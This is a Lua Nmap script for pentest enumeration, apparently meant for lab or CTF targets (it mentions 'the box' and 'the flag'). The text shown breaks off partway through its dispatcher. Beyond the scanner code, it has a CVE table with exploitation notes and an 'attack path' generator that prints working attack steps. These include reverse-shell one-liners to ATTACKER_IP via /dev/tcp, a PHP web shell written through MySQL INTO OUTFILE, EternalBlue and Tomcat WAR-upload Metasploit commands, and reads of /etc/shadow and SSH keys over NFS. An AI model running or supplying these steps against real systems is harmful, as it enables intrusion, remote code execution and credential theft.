-- =============================================================================
-- reko.nse  --  Automated Active and Passive Network Enumeration Framework
-- Assembled from Day 1-8 build files.
-- Fixed for Lua 5.1 (NSE): each module block wrapped in do...end to stay
-- under the 200 local variable limit per function scope.
-- =============================================================================
-- ── DAY 1: Core skeleton, constants, registry ─────────────────────────────
-- =============================================================================
-- reko.nse  –  Automated Active & Passive Network Enumeration Framework
-- Version   : 0.1.0-dev  (Day 1: Skeleton + Initialization Layer)
-- Author    : Mayan Suthar
-- License   : Same as Nmap -- See https://nmap.org/book/man-legal.html
-- Category  : discovery, safe
-- =============================================================================
-- USAGE:
--   nmap -sV --script reko.nse <target>
--   nmap -sV --script reko.nse --script-args reko.aggression=1 <target>
--   nmap -sV --script reko.nse --script-args reko.output=json <target>
-- =============================================================================

-- ---------------------------------------------------------------------------
-- HEAD: Standard NSE metadata block
-- ---------------------------------------------------------------------------
description = [[
Reko is a prioritized, modular network enumeration framework built as a single
Nmap NSE script. It covers 25+ services, performs risk-based prioritization of
findings, and outputs structured JSON / human-readable reports suitable for
penetration testing triage and post-engagement reporting.

Passive checks (banner grabbing, TLS cert analysis, OS detection) run by
default. Active checks (anonymous login attempts, share listing, directory
probing) require explicit opt-in via script arguments.

Script arguments:
  reko.aggression  : 0=passive only (default), 1=safe-active, 2=full-active
  reko.timeout     : per-module socket timeout in ms (default 5000)
  reko.output      : "text" (default) | "json" | "both"
  reko.modules     : comma-separated list of modules to run (default: all)
  reko.loglevel    : 0=errors only, 1=warnings, 2=info (default 1)
  reko.redact      : true=redact sensitive fields in output (default true)
]]

author      = "Mayan Suthar"
license     = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories  = {"discovery", "safe"}

-- ---------------------------------------------------------------------------
-- LIBRARY IMPORTS
-- ---------------------------------------------------------------------------
local nmap     = require "nmap"
local stdnse   = require "stdnse"
local shortport= require "shortport"
local json     = require "json"
local string   = require "string"
local table    = require "table"
local math     = require "math"
local os       = require "os"
local smb      = require "smb"       -- NSE SMB library (share enumeration)

-- ---------------------------------------------------------------------------
-- CONSTANTS
-- ---------------------------------------------------------------------------
local REKO_VERSION = "0.1.0-dev"

-- Aggression levels
local AGG_PASSIVE      = 0   -- banner grabbing, TLS, OS fingerprint only
local AGG_SAFE_ACTIVE  = 1   -- anonymous logins, read-only share listing
local AGG_FULL_ACTIVE  = 2   -- credential checks (requires explicit opt-in)

-- Default per-module socket timeout (milliseconds)
local DEFAULT_TIMEOUT  = 5000

-- Output modes
local OUT_TEXT = "text"
local OUT_JSON = "json"
local OUT_BOTH = "both"

-- Log levels
local LOG_ERROR   = 0
local LOG_WARNING = 1
local LOG_INFO    = 2

-- Risk priority buckets (used by the scoring engine)
local PRIORITY = {
  CRITICAL = "CRITICAL",   -- score >= 0.85
  HIGH     = "HIGH",       -- score >= 0.65
  MEDIUM   = "MEDIUM",     -- score >= 0.40
  LOW      = "LOW",        -- score >= 0.20
  INFO     = "INFO",       -- score <  0.20
}

-- Base impact weights by service (used in scoring; modules may override)
-- Values are 0.0 – 1.0; higher = higher exploitability / attack-surface
local SERVICE_BASE_WEIGHT = {
  smb          = 0.90,
  rdp          = 0.85,
  ftp          = 0.80,
  vnc          = 0.80,
  mssql        = 0.78,
  oracle_tns   = 0.75,
  mysql        = 0.75,
  postgresql   = 0.70,
  ldap         = 0.70,
  snmp         = 0.70,
  nfs          = 0.68,
  kerberos     = 0.65,
  rpc          = 0.62,
  http         = 0.60,
  https        = 0.60,
  ajp          = 0.60,
  imap         = 0.50,
  imaps        = 0.50,
  pop3         = 0.50,
  pop3s        = 0.50,
  smtp         = 0.50,
  smtps        = 0.50,
  ssh          = 0.45,
  dns          = 0.40,
  sip          = 0.38,
  java_rmi     = 0.35,
  ntp          = 0.30,
  netbios_ns   = 0.30,
  ident        = 0.20,
  telnet       = 0.80,   -- cleartext credentials = high value
  irc          = 0.55,   -- backdoor CVE-2010-2075 on UnrealIRCd
}

-- Port-to-service mapping used by the module dispatcher
-- Format: [port_number] = { service_key, protocol ("tcp"|"udp") }
local PORT_SERVICE_MAP = {
  [21]   = { key = "ftp",          proto = "tcp" },
  [22]   = { key = "ssh",          proto = "tcp" },
  [25]   = { key = "smtp",         proto = "tcp" },
  [53]   = { key = "dns",          proto = "tcp" },  -- udp handled separately
  [80]   = { key = "http",         proto = "tcp" },
  [88]   = { key = "kerberos",     proto = "tcp" },
  [110]  = { key = "pop3",         proto = "tcp" },
  [111]  = { key = "rpc",          proto = "tcp" },
  [113]  = { key = "ident",        proto = "tcp" },
  [135]  = { key = "rpc",          proto = "tcp" },
  [137]  = { key = "netbios_ns",   proto = "udp" },
  [139]  = { key = "smb",          proto = "tcp" },
  [143]  = { key = "imap",         proto = "tcp" },
  [161]  = { key = "snmp",         proto = "udp" },
  [389]  = { key = "ldap",         proto = "tcp" },
  [443]  = { key = "https",        proto = "tcp" },
  [445]  = { key = "smb",          proto = "tcp" },
  [464]  = { key = "kerberos",     proto = "tcp" },
  [993]  = { key = "imaps",        proto = "tcp" },
  [995]  = { key = "pop3s",        proto = "tcp" },
  [1099] = { key = "java_rmi",     proto = "tcp" },
  [1100] = { key = "java_rmi",     proto = "tcp" },
  [1433] = { key = "mssql",        proto = "tcp" },
  [1521] = { key = "oracle_tns",   proto = "tcp" },
  [2049] = { key = "nfs",          proto = "tcp" },
  [3268] = { key = "ldap",         proto = "tcp" },
  [3306] = { key = "mysql",        proto = "tcp" },
  [3389] = { key = "rdp",          proto = "tcp" },
  [5060] = { key = "sip",          proto = "udp" },
  [5432] = { key = "postgresql",   proto = "tcp" },
  [23]   = { key = "telnet",        proto = "tcp" },
  [6667] = { key = "irc",           proto = "tcp" },
  [6697] = { key = "irc",           proto = "tcp" },
  [2121] = { key = "ftp",          proto = "tcp" },
  [990]  = { key = "ftp",          proto = "tcp" },
  [3389] = { key = "rdp",          proto = "tcp" },
  [5900] = { key = "vnc",          proto = "tcp" },
  [8009] = { key = "ajp",          proto = "tcp" },
  [8080] = { key = "http",         proto = "tcp" },
  [8180] = { key = "http",         proto = "tcp" },
  [8443] = { key = "https",        proto = "tcp" },
  [8888] = { key = "http",         proto = "tcp" },
  [123]  = { key = "ntp",          proto = "udp" },
}


-- ── CVE Lookup Table (C4) ──────────────────────────────────────────────────
-- Maps "software:version_prefix" → { cve, severity, exploitdb_id, note }
-- Used by modules to enrich version-disclosure findings automatically.
local CVE_DB = {
  -- FTP
  ["vsftpd:2.3.4"]       = { cve="CVE-2011-2523", severity="CRITICAL", edb="17491",
                              note="Backdoor planted in source. Send USER user:) to open shell on port 6200" },
  ["proftpd:1.3.3"]      = { cve="CVE-2010-4221", severity="HIGH",     edb="15449",
                              note="Remote stack overflow via TELNET_IAC commands" },
  -- SSH
  ["openssh:4."]         = { cve="CVE-2008-0166", severity="CRITICAL", edb="5720",
                              note="Debian weak key generation (predictable keys)" },
  ["openssh:7.2p2"]      = { cve="CVE-2016-0777", severity="MEDIUM",   edb=nil,
                              note="Roaming feature leaks private keys" },
  -- HTTP / Apache
  ["apache:2.2."]        = { cve="CVE-2017-7679", severity="CRITICAL", edb="42069",
                              note="mod_mime buffer overread. Also check CVE-2017-9798 (Optionsbleed)" },
  ["apache:2.4.49"]      = { cve="CVE-2021-41773", severity="CRITICAL", edb="50383",
                              note="Path traversal + RCE if mod_cgi enabled. Full CRITICAL chain." },
  ["apache:2.4.50"]      = { cve="CVE-2021-42013", severity="CRITICAL", edb="50406",
                              note="Incomplete fix for CVE-2021-41773. Traversal still possible." },
  -- DNS / BIND
  ["bind:9.4."]          = { cve="CVE-2008-1447", severity="HIGH",     edb=nil,
                              note="Kaminsky DNS cache poisoning. Predictable transaction IDs." },
  ["bind:9.4.2"]         = { cve="CVE-2008-1447", severity="HIGH",     edb=nil,
                              note="Kaminsky attack + multiple DoS CVEs in 9.4.x series" },
  -- MySQL
  ["mysql:5.0."]         = { cve="CVE-2012-2122", severity="CRITICAL", edb="19092",
                              note="Authentication bypass: repeated login with wrong password succeeds ~1/256 times" },
  ["mysql:5.1."]         = { cve="CVE-2012-2122", severity="CRITICAL", edb="19092",
                              note="Same CVE-2012-2122 auth bypass" },
  -- PostgreSQL
  ["postgresql:8.3."]    = { cve="CVE-2013-1899", severity="HIGH",     edb=nil,
                              note="Database name parameter injection allows DoS" },
  -- Samba / SMB
  ["samba:3."]           = { cve="CVE-2017-7494", severity="CRITICAL", edb="42060",
                              note="SambaCry: arbitrary shared library loading → RCE. Like EternalBlue for Linux." },
  -- Tomcat
  ["apache-coyote:1.1"]  = { cve="CVE-2017-12617", severity="CRITICAL", edb="43008",
                              note="JSP upload via PUT when readonly=false. Direct RCE." },
  -- UnrealIRCd
  ["unrealircd:3.2.8.1"] = { cve="CVE-2010-2075", severity="CRITICAL", edb="13853",
                              note="Backdoor in source distribution. Send AB; followed by command for RCE." },
  -- ProFTPD
  ["proftpd:1.3.1"]      = { cve="CVE-2010-4221", severity="HIGH",     edb="15449",
                              note="Buffer overflow via TELNET_IAC sequence" },
  ["proftpd:1.3.3"]      = { cve="CVE-2011-4130", severity="CRITICAL", edb="18377",
                              note="mod_copy SITE CPFR/CPTO allows unauthenticated file copy → RCE" },
  -- PHP
  ["php:5.2."]           = { cve="CVE-2012-1823", severity="CRITICAL", edb="18836",
                              note="PHP-CGI query string param injection → source disclosure + RCE" },
  ["php:5.3."]           = { cve="CVE-2012-1823", severity="CRITICAL", edb="18836",
                              note="Same CGI RCE as 5.2.x" },
  -- OpenSSL
  ["openssl:1.0.1"]      = { cve="CVE-2014-0160", severity="CRITICAL", edb="32745",
                              note="Heartbleed: read up to 64KB of server memory per request" },
}

--- Look up CVE info for a software name + version string.
-- Returns nil if no match found.
-- @param software string  e.g. "vsftpd", "Apache", "OpenSSH_4.7p1"
-- @param version  string  e.g. "2.3.4", "4.7p1"
local function cve_lookup(software, version)
  if not software or not version then return nil end
  local sw  = software:lower():gsub("[^%w]", "")
  local ver = version:lower()

  -- Try exact key first, then prefix matches
  for key, info in pairs(CVE_DB) do
    local key_sw, key_ver = key:match("^([^:]+):(.+)$")
    if key_sw and key_ver then
      -- Normalise software name for comparison
      local ksw = key_sw:lower():gsub("[^%w]", "")
      if sw:find(ksw, 1, true) or ksw:find(sw, 1, true) then
        -- Version prefix match
        if ver:sub(1, #key_ver) == key_ver then
          return info
        end
      end
    end
  end
  return nil
end


-- ── ATTACK PATH SYNTHESISER (C8) ──────────────────────────────────────────
-- After all modules run, scan the global finding registry and produce a
-- concise ranked attack path summary. Called once per full scan target.
-- We store a per-host findings registry in nmap's registry for cross-port access.

local REKO_REGISTRY_KEY = "reko_findings_registry"

--- Record a finding into the global per-host registry so the synthesiser
--- can see findings from ALL ports when building the attack path summary.
local function registry_record(host_ip, finding)
  local reg = nmap.registry[REKO_REGISTRY_KEY] or {}
  local host_findings = reg[host_ip] or {}
  table.insert(host_findings, finding)
  reg[host_ip] = host_findings
  nmap.registry[REKO_REGISTRY_KEY] = reg
end

--- Retrieve all findings for a host from the global registry.
local function registry_get(host_ip)
  local reg = nmap.registry[REKO_REGISTRY_KEY] or {}
  return reg[host_ip] or {}
end

--- Build an attack path summary from all findings collected for a host.
-- Returns a formatted string or nil if not enough findings yet.
local function build_attack_path_summary(host_ip, current_port)
  local all_findings = registry_get(host_ip)
  if #all_findings < 3 then return nil end

  -- Only generate the summary on the last/highest port to avoid duplication
  -- We generate it when we have at least 5 findings from 3+ different ports
  local port_set = {}
  for _, f in ipairs(all_findings) do
    port_set[f.port or 0] = true
  end
  local port_count = 0
  for _ in pairs(port_set) do port_count = port_count + 1 end
  if port_count < 2 then return nil end

  -- Sort all findings by score descending
  local sorted = {}
  for _, f in ipairs(all_findings) do
    table.insert(sorted, f)
  end
  table.sort(sorted, function(a,b) return (a.score or 0) > (b.score or 0) end)

  -- Known attack chain patterns: if finding A + finding B exist, suggest path
  local paths = {}

  -- Check for specific high-value combinations
  local has = {}
  for _, f in ipairs(sorted) do
    local title = (f.title or ""):lower()
    local svc   = (f.service or ""):lower()
    if title:find("backdoor") and title:find("vsftpd") then has.vsftpd_backdoor = f end
    if title:find("backdoor") and title:find("unreal") then has.irc_backdoor = f end
    if title:find("ghostcat")                           then has.ghostcat = f end
    if title:find("anonymous login") and svc == "ftp"  then has.ftp_anon = f end
    if title:find("writable") and svc == "ftp"         then has.ftp_write = f end
    if title:find("tomcat manager")                     then has.tomcat_mgr = f end
    if title:find("put") and title:find("delete")       then has.http_put = f end
    if title:find("smb.*null session") or (title:find("null session") and svc=="smb") then has.smb_null = f end
    if title:find("smbv1")                              then has.smb_v1 = f end
    if title:find("mysql.*credential") or title:find("mysql.*empty") then has.mysql_root = f end
    if title:find("postgresql.*trust")                  then has.pg_trust = f end
    if title:find("telnet.*credential")                 then has.telnet_shell = f end
    if title:find("vnc.*none") or title:find("no password") then has.vnc_noauth = f end
    if title:find("nfs.*mount") or title:find("world.*export") then has.nfs_mount = f end
    if title:find("phpinfo")                            then has.phpinfo = f end
    if title:find("anonymous bind") and svc == "ldap"  then has.ldap_anon = f end
  end

  -- Path 1: vsftpd backdoor (fastest possible path to root)
  if has.vsftpd_backdoor then
    table.insert(paths, {
      rank  = 1,
      score = 0.99,
      title = "PATH 1 — IMMEDIATE ROOT: vsftpd 2.3.4 Backdoor",
      steps = {
        "nc " .. host_ip .. " 6200",
        "id   →  you are root",
      },
      why   = "CVE-2011-2523: send USER user:) to FTP, then connect port 6200 for root shell. No credentials needed. Fastest path in the box.",
    })
  end

  -- Path 2: IRC UnrealIRCd backdoor
  if has.irc_backdoor then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.97,
      title = "PATH " .. (#paths+1) .. " — RCE: UnrealIRCd Backdoor",
      steps = {
        'echo "AB;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | nc ' .. host_ip .. " 6667",
        "nc -lvnp 4444  (on attacker)",
      },
      why   = "CVE-2010-2075: AB; prefix triggers command execution as IRC daemon user.",
    })
  end

  -- Path 3: Tomcat Manager WAR upload → RCE
  if has.tomcat_mgr then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.96,
      title = "PATH " .. (#paths+1) .. " — RCE: Tomcat Manager WAR Upload",
      steps = {
        "msfconsole: use multi/http/tomcat_mgr_upload",
        "set RHOSTS " .. host_ip .. "; set RPORT 8180",
        "set HttpUsername tomcat; set HttpPassword tomcat; run",
      },
      why   = "Tomcat Manager with default creds allows WAR file deployment = arbitrary code execution.",
    })
  end

  -- Path 4: Ghostcat → read web.xml → may expose creds → RCE if upload exists
  if has.ghostcat then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.94,
      title = "PATH " .. (#paths+1) .. " — FILE READ → POTENTIAL RCE: Ghostcat",
      steps = {
        "python3 ghostcat.py -H " .. host_ip .. " -f /WEB-INF/web.xml",
        "Check web.xml for credentials or included files",
        "If file upload exists: upload JSP shell, include via AJP → RCE",
      },
      why   = "CVE-2020-1938: AJP file inclusion reads any webapp file. If file upload is present, chain to RCE.",
    })
  end

  -- Path 5: FTP anon + HTTP PUT/Tomcat = upload shell
  if has.ftp_anon and has.http_put then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.88,
      title = "PATH " .. (#paths+1) .. " — UPLOAD CHAIN: FTP Anon + HTTP PUT",
      steps = {
        "ftp " .. host_ip .. "  (user: anonymous, pass: anything)",
        "Upload reverse shell: PUT shell.php",
        "curl http://" .. host_ip .. ":8180/shell.php?cmd=id",
      },
      why   = "Anonymous FTP write + HTTP PUT methods = upload a web shell, trigger via HTTP.",
    })
  end

  -- Path 6: MySQL root empty password
  if has.mysql_root then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.95,
      title = "PATH " .. (#paths+1) .. " — DB ROOT: MySQL Empty Password",
      steps = {
        "mysql -h " .. host_ip .. " -u root --password=''",
        "SELECT '<?php system($_REQUEST[chr(99)..chr(109)..chr(100)]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
        "curl http://" .. host_ip .. "/shell.php?cmd=id",
      },
      why   = "MySQL root with no password → write PHP shell to web root via SELECT INTO OUTFILE → RCE.",
    })
  end

  -- Path 7: PostgreSQL trust auth
  if has.pg_trust then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.90,
      title = "PATH " .. (#paths+1) .. " — DB ROOT: PostgreSQL Trust Auth",
      steps = {
        "psql -h " .. host_ip .. " -U postgres",
        "COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1';",
      },
      why   = "PostgreSQL trust auth = no password for superuser. COPY TO PROGRAM = OS command execution.",
    })
  end

  -- Path 8: VNC no auth
  if has.vnc_noauth then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.95,
      title = "PATH " .. (#paths+1) .. " — DESKTOP: VNC No Authentication",
      steps = {
        "vncviewer " .. host_ip .. ":1",
        "Full desktop access — no password required",
      },
      why   = "VNC with no authentication gives interactive graphical desktop control immediately.",
    })
  end

  -- Path 9: NFS world-accessible mount
  if has.nfs_mount then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.85,
      title = "PATH " .. (#paths+1) .. " — FILESYSTEM: NFS World Mount",
      steps = {
        "showmount -e " .. host_ip,
        "mkdir /mnt/nfs && mount -t nfs " .. host_ip .. ":/  /mnt/nfs",
        "cat /mnt/nfs/etc/shadow  or  cat /mnt/nfs/root/.ssh/id_rsa",
      },
      why   = "World-accessible NFS export may include sensitive files, SSH keys, or the flag.",
    })
  end

  -- Path 10: SMBv1 → EternalBlue (if Windows target indicators)
  if has.smb_v1 then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.88,
      title = "PATH " .. (#paths+1) .. " — SMBv1: EternalBlue / SambaCry",
      steps = {
        "For Linux/Samba: use exploit/linux/samba/is_known_pipename",
        "set RHOSTS " .. host_ip .. "; run",
        "For Windows: use exploit/windows/smb/ms17_010_eternalblue",
      },
      why   = "SMBv1 active + signing disabled. SambaCry (CVE-2017-7494) for Linux, EternalBlue (MS17-010) for Windows.",
    })
  end

  -- Telnet shell
  if has.telnet_shell then
    table.insert(paths, {
      rank  = #paths + 1,
      score = 0.92,
      title = "PATH " .. (#paths+1) .. " — SHELL: Telnet Default Credentials",
      steps = {
        "telnet " .. host_ip,
        "Login with discovered credentials",
        "sudo -l  or  cat /etc/crontab for priv esc",
      },
      why   = "Telnet accepted default credentials. Direct shell access — pivot to root from here.",
    })
  end

  if #paths == 0 then return nil end

  -- Sort paths by score
  table.sort(paths, function(a,b) return (a.score or 0) > (b.score or 0) end)

  -- Format the summary
  local lines = {}
  table.insert(lines, string.rep("=", 65))
  table.insert(lines, "REKO ATTACK PATH SUMMARY — " .. host_ip)
  table.insert(lines, string.format("%d CRITICAL/HIGH findings across %d ports", #all_findings, port_count))
  table.insert(lines, string.rep("=", 65))

  local shown = math.min(3, #paths)   -- show top 3 paths
  for i = 1, shown do
    local p = paths[i]
    table.insert(lines, "")
    table.insert(lines, string.format("► %s", p.title))
    table.insert(lines, "  WHY: " .. p.why)
    table.insert(lines, "  HOW:")
    for j, step in ipairs(p.steps) do
      table.insert(lines, string.format("    %d. %s", j, step))
    end
  end

  table.insert(lines, "")
  table.insert(lines, string.rep("─", 65))
  table.insert(lines, string.format("Full finding list: %d findings sorted by score above.", #all_findings))
  table.insert(lines, string.rep("=", 65))

  return table.concat(lines, "\n")
end

-- ---------------------------------------------------------------------------
-- PORTRULE
-- The script runs on any open port that appears in our PORT_SERVICE_MAP.
-- shortport.port_or_service provides a flexible, idiomatic match.
-- ---------------------------------------------------------------------------
portrule = function(host, port)
  -- Run on any open TCP/UDP port we explicitly cover
  if port.state ~= "open" and port.state ~= "open|filtered" then
    return false
  end
  return PORT_SERVICE_MAP[port.number] ~= nil
end

-- ===========================================================================
-- INITIALIZATION LAYER
-- init_context() is called once per host/port invocation. It normalises
-- script arguments, resolves which module to run, and builds the shared
-- 'ctx' object that every module receives.
-- ===========================================================================

--- Parse and validate a script argument with a default fallback.
-- @param name  string  argument name (without "reko." prefix)
-- @param default  any  fallback value
-- @return  resolved value
local function get_arg(name, default)
  local val = stdnse.get_script_args("reko." .. name)
  if val == nil then return default end
  return val
end

--- Convert a string "true"/"false" to a boolean.
local function str_to_bool(s, default)
  if s == nil then return default end
  if type(s) == "boolean" then return s end
  s = tostring(s):lower()
  if s == "true" or s == "1" or s == "yes" then return true end
  if s == "false" or s == "0" or s == "no" then return false end
  return default
end

--- Parse a comma-separated module list into a set (table with boolean values).
-- Returns nil if the argument is not set (meaning: run all modules).
local function parse_module_list(raw)
  if raw == nil or raw == "" then return nil end
  local set = {}
  for m in raw:gmatch("[^,]+") do
    set[m:match("^%s*(.-)%s*$")] = true   -- trim whitespace
  end
  return set
end

--- Resolve the canonical service key for the current port.
-- Falls back to the Nmap service name if not in our map.
local function resolve_service_key(port)
  local entry = PORT_SERVICE_MAP[port.number]
  if entry then return entry.key end
  -- graceful fallback: use nmap's detected service name
  if port.service then
    local s = port.service:lower()
    if SERVICE_BASE_WEIGHT[s] then return s end
  end
  return "unknown"
end

--- Build the canonical run context for a host/port invocation.
-- This is the single object passed to every service module.
-- @param host  nmap host object
-- @param port  nmap port object
-- @return  ctx table
local function init_context(host, port)
  -- Resolve script arguments
  local raw_aggression = get_arg("aggression", "0")
  local aggression     = tonumber(raw_aggression) or AGG_PASSIVE
  aggression = math.max(AGG_PASSIVE, math.min(AGG_FULL_ACTIVE, aggression))

  local raw_timeout    = get_arg("timeout", tostring(DEFAULT_TIMEOUT))
  local timeout        = tonumber(raw_timeout) or DEFAULT_TIMEOUT

  local output_mode    = get_arg("output", OUT_TEXT):lower()
  if output_mode ~= OUT_TEXT and output_mode ~= OUT_JSON and output_mode ~= OUT_BOTH then
    output_mode = OUT_TEXT
  end

  local raw_modules    = get_arg("modules", nil)
  local module_filter  = parse_module_list(raw_modules)

  local raw_loglevel   = get_arg("loglevel", "1")
  local loglevel       = tonumber(raw_loglevel) or LOG_WARNING
  loglevel = math.max(LOG_ERROR, math.min(LOG_INFO, loglevel))

  local redact         = str_to_bool(get_arg("redact", nil), true)

  -- Resolve target service
  local service_key    = resolve_service_key(port)
  local base_weight    = SERVICE_BASE_WEIGHT[service_key] or 0.30

  -- Unique scan run ID (host + port + timestamp)
  local run_id = string.format("reko-%s-%d-%d",
    host.ip:gsub("%.", "-"), port.number, os.time())

  -- Build context
  local ctx = {
    -- Nmap objects (raw access for modules that need them)
    host          = host,
    port          = port,

    -- Resolved target info
    target_ip     = host.ip,
    target_host   = host.targetname or host.ip,
    port_number   = port.number,
    protocol      = port.protocol or "tcp",
    service_key   = service_key,
    base_weight   = base_weight,

    -- Configuration
    config = {
      aggression    = aggression,
      timeout       = timeout,           -- ms
      output_mode   = output_mode,
      module_filter = module_filter,     -- nil = all modules
      loglevel      = loglevel,
      redact        = redact,
    },

    -- Runtime state (populated during execution)
    run_id        = run_id,
    start_time    = os.time(),
    findings      = {},   -- list of normalised finding records
    errors        = {},   -- list of {module, message} tables
    module_ran    = nil,  -- name of the module that executed
  }

  return ctx
end

-- ===========================================================================
-- LOGGING HELPERS
-- Lightweight wrappers around stdnse.print_debug that respect ctx.config.loglevel
-- ===========================================================================

local function log_error(ctx, module_name, msg)
  stdnse.print_debug(1, "[reko][ERROR][%s] %s", module_name, msg)
  table.insert(ctx.errors, { module = module_name, message = msg, level = "ERROR" })
end

local function log_warn(ctx, module_name, msg)
  if ctx.config.loglevel >= LOG_WARNING then
    stdnse.print_debug(2, "[reko][WARN][%s] %s", module_name, msg)
  end
end

local function log_info(ctx, module_name, msg)
  if ctx.config.loglevel >= LOG_INFO then
    stdnse.print_debug(3, "[reko][INFO][%s] %s", module_name, msg)
  end
end

-- ===========================================================================
-- NORMALISATION HELPERS
-- Each service module must return findings in the canonical schema below.
-- Use new_finding() to create a correctly-typed record.
-- ===========================================================================

--- Create a new finding record with required fields and safe defaults.
-- Modules call this to ensure schema compliance.
--
-- @param ctx           context object
-- @param title         string   short description of the finding
-- @param description   string   extended narrative
-- @param evidence      table    key-value pairs supporting the finding
-- @param confidence    number   0.0 – 1.0  (certainty of the result)
-- @param impact_weight number   0.0 – 1.0  (exploitability / severity)
-- @return  finding table conforming to the canonical schema
local function new_finding(ctx, title, description, evidence, confidence, impact_weight)
  -- Validate / clamp numeric fields
  confidence    = math.max(0, math.min(1, tonumber(confidence)    or 0.5))
  impact_weight = math.max(0, math.min(1, tonumber(impact_weight) or ctx.base_weight))

  -- Composite score: weighted average of confidence and impact
  local score = (confidence * 0.40) + (impact_weight * 0.60)
  score = math.floor(score * 100 + 0.5) / 100  -- round to 2dp

  -- Assign priority bucket
  local priority
  if     score >= 0.85 then priority = PRIORITY.CRITICAL
  elseif score >= 0.65 then priority = PRIORITY.HIGH
  elseif score >= 0.40 then priority = PRIORITY.MEDIUM
  elseif score >= 0.20 then priority = PRIORITY.LOW
  else                       priority = PRIORITY.INFO
  end

  -- Redact sensitive evidence fields if configured
  if ctx.config.redact and type(evidence) == "table" then
    local sensitive_keys = { password=1, credential=1, hash=1, secret=1, token=1, key=1 }
    for k, _ in pairs(evidence) do
      if sensitive_keys[k:lower()] then
        evidence[k] = "[REDACTED]"
      end
    end
  end

  return {
    -- Identity
    id            = string.format("%s-%s-%d", ctx.run_id, ctx.service_key, #ctx.findings + 1),
    run_id        = ctx.run_id,

    -- Target
    host          = ctx.target_ip,
    port          = ctx.port_number,
    service       = ctx.service_key,

    -- Finding content
    title         = title         or "(no title)",
    description   = description   or "",
    evidence      = evidence      or {},

    -- Scoring
    confidence    = confidence,
    impact_weight = impact_weight,
    score         = score,
    priority      = priority,

    -- Provenance
    module        = ctx.module_ran or "unknown",
    reko_version  = REKO_VERSION,
    scan_metadata = {
      scan_id   = ctx.run_id,
      timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", ctx.start_time),
    },
  }
end

-- ===========================================================================
-- OUTPUT / REPORTING HELPERS
-- ===========================================================================

--- Format a single finding for human-readable console output.
local function format_finding_text(f)
  local lines = {}
  table.insert(lines, string.format(
    "[%s][%s:%d][%s] %s  (score: %.2f, %s)",
    f.priority, f.host, f.port, f.service:upper(), f.title, f.score, f.priority
  ))
  if f.description and f.description ~= "" then
    table.insert(lines, "  " .. f.description)
  end
  -- Evidence
  if f.evidence and next(f.evidence) then
    for k, v in pairs(f.evidence) do
      table.insert(lines, string.format("  evidence.%s = %s", k, tostring(v)))
    end
  end
  table.insert(lines, string.format(
    "  confidence=%.2f  impact=%.2f  module=%s",
    f.confidence, f.impact_weight, f.module
  ))
  return table.concat(lines, "\n")
end

--- Sort findings by score descending (highest priority first).
local function sort_findings(findings)
  table.sort(findings, function(a, b) return a.score > b.score end)
  return findings
end

--- Build the final NSE return string from the context.
local function build_output(ctx)
  if #ctx.findings == 0 then
    log_info(ctx, "output", "No findings recorded for " .. ctx.run_id)
    return nil  -- returning nil means nmap shows nothing for this host/port
  end

  sort_findings(ctx.findings)
  local mode = ctx.config.output_mode

  -- JSON output
  if mode == OUT_JSON or mode == OUT_BOTH then
    local payload = {
      reko_version = REKO_VERSION,
      run_id       = ctx.run_id,
      host         = ctx.target_ip,
      port         = ctx.port_number,
      service      = ctx.service_key,
      findings     = ctx.findings,
      errors       = ctx.errors,
    }
    local ok, encoded = pcall(json.generate, payload)
    if not ok then
      log_error(ctx, "output", "JSON serialisation failed: " .. tostring(encoded))
    elseif mode == OUT_JSON then
      return encoded
    elseif mode == OUT_BOTH then
      -- Fall through to also generate text
      local text_parts = { encoded }
      for _, f in ipairs(ctx.findings) do
        table.insert(text_parts, format_finding_text(f))
      end
      return table.concat(text_parts, "\n")
    end
  end

  -- Default: human-readable text
  local lines = {}
  table.insert(lines, string.format(
    "Reko %s  run_id=%s  service=%s",
    REKO_VERSION, ctx.run_id, ctx.service_key
  ))
  for _, f in ipairs(ctx.findings) do
    table.insert(lines, format_finding_text(f))
  end
  if #ctx.errors > 0 then
    table.insert(lines, "ERRORS:")
    for _, e in ipairs(ctx.errors) do
      table.insert(lines, string.format("  [%s] %s", e.module, e.message))
    end
  end
  return table.concat(lines, "\n")
end

-- ===========================================================================
-- MODULE REGISTRY
-- Modules register themselves by calling register_module(key, run_fn).
-- The dispatcher calls run_fn(ctx) for the appropriate service key.
-- Each module file should be require()'d at the bottom of this script,
-- or loaded lazily once per unique service key (future enhancement).
-- ===========================================================================

local MODULE_REGISTRY = {}

--- Register a service module.
-- @param service_key  string  matches SERVICE_BASE_WEIGHT keys
-- @param run_fn       function  called with (ctx); must call ctx:add_finding(...)
local function register_module(service_key, run_fn)
  if type(run_fn) ~= "function" then
    stdnse.print_debug(1, "[reko] register_module: run_fn must be a function for '%s'", service_key)
    return
  end
  if MODULE_REGISTRY[service_key] then
    stdnse.print_debug(2, "[reko] register_module: overwriting existing module for '%s'", service_key)
  end
  MODULE_REGISTRY[service_key] = run_fn
end

--- Convenience method added onto ctx so modules can record findings cleanly.
local function ctx_add_finding(ctx, title, description, evidence, confidence, impact_weight)
  local f = new_finding(ctx, title, description, evidence, confidence, impact_weight)
  table.insert(ctx.findings, f)
  log_info(ctx, ctx.module_ran or "?", string.format("Finding recorded: [%s] %s (%.2f)", f.priority, f.title, f.score))
end

-- ===========================================================================
-- MODULE DISPATCHER
-- Finds the registered module for the detected service and invokes it.
-- Handles timeouts, unknown services, and module filter (reko.modules arg).
-- ===========================================================================

local function dispatch_to_modules(ctx)
  local key = ctx.service_key

  -- Check module filter
  if ctx.config.module_filter and not ctx.config.module_filter[key] then
    log_info(ctx, "dispatcher", string.format("Module '%s' excluded by filter", key))
    return
  end

  local run_fn = MODULE_REGISTRY[key]
  if not run_fn then
    log_info(ctx, "dispatcher", string.format(
      "No module registered for service '%s' on port %d -- skipping",
